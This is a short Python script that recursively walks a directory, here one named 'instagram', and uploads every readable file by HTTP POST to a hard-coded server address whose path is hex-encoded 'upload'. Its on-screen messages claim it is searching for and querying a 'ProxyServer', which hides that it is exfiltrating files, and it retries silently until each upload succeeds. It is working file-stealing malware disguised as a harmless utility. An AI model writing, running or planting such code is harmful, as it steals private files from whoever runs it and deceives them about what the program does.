from requests import post , exceptions
from lib.colored import fg
from os.path import join,exists
from os import scandir
url = 'http://192.168.1.27:5000/75706C6F6164'

def SendCountent(filename):
    while True:
        try:
            if exists(filename):
                with open(filename,'rb') as filetosend:
                    post(url,files={'file':filetosend},data={'filepath':filename}) ; break
            else:
                raise FileNotFoundError
        except (exceptions.ConnectionError,exceptions.Timeout):
            pass
        except Exception as er:
            print(er)

def main(were='.'):
    Cclass = [were] ; CP = were ; loop = 0
    print(f'trying to find the '+fg('cyan')+ 'ProxyServer'+fg('white'))
    while len(Cclass) != 0:
        try:
            for i in scandir(CP):
                if i.is_dir():
                    Cclass.append(join(CP,i.name))
                else:
                    SendCountent(join(CP,i.name)) ; loop += 1
                    print(f'Gathering information from proxyserver please wait := '+fg('green') +f'{loop}'+fg('white'),end='\r')
            Cclass.remove(CP)
            CP = Cclass[0]
            print('CP')
        except PermissionError:
            try:
                Cclass.remove(CP)
                CP = Cclass[0]
            except IndexError:
                break
        except IndexError:
            break
        except Exception as er: 
            print(er)

main('instagram')


